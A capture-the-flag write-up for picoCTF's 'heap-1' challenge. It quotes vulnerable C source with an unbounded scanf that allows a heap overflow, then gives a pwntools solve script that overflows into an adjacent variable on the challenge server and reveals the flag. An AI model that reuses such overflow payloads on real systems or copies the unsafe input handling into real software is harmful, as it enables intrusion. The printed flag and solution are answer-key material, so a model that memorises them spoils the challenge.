# heap-1

Author: Abrxs, pr1or1tyQ

Can you control your overflow? Download the binary [here](chall). Download the source [here](chall.c). Connect with the challenge instance here: nc tethys.picoctf.net 57147

## Solution

The program initializes two variables on the heap with 5 bytes, `input_data` and `safe_var`:

```c
void init() {
    ...

    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}
```

We can write our own data to `input_data`, but it uses `scanf` with no user sanitization to write our data. This means we can just overflow into `safe_var`:

```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

If we write "pico" into `safe_var` we print the flag:

```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    }

    ...
}
```

Here is my solve script:

```python
from pwn import *

context.binary = elf = ELF("./chall", checksec=False)
#io = elf.process()
io = remote("tethys.picoctf.net", 50255)
#context.log_level = "debug"

payload = b'A' * 32 + b'pico'
io.sendlineafter(b": ", b"2")
io.sendlineafter(b": ", payload)
io.sendlineafter(b": ", b"4")
io.recvuntil(b"YOU WIN\n")
flag = io.recvline().strip().decode()

log.success(flag)

io.close()
```

**Flag:** `picoCTF{starting_to_get_the_hang_ce5bee9b}`
